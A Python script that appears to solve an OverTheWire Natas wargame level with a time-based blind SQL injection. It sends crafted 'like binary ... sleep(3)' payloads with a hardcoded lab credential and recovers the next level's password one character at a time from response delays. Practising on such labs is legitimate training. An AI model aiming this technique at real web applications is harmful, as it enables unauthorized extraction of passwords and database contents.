import requests

headers = {'content-type': 'application/x-www-form-urlencoded'}  
length = 32
characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
url = 'http://natas17.natas.labs.overthewire.org/index.php'
  
present_chars = '' 
  
for i in range(len(characters)):  
        payload = 'username=natas18%22+and+password+like+binary+%27%25{0}%25%27+and+sleep%283%29+%23'.format(characters[i])  
        r = requests.post(url, auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), data=payload, headers=headers) 
        print("\n[+] Trying [query : ",end="")
        print(payload,end="")
        if(r.elapsed.seconds >= 2):  
                present_chars += characters[i]
                print("] -> [+] True")
        else :
                print("] -> [-] False")
  
print(present_chars) 

password = ''

for i in range(32):  
        for char in present_chars:  
                payload = 'username=natas18%22%20and%20password%20like%20binary%20\'{0}%25\'%20and%20sleep(3)%23'.format(password + char)  
                r = requests.post(url, auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), data=payload, headers=headers)  
                if(r.elapsed.seconds >= 2):  
                        password = password + char  
                        print(password)  
                        break 
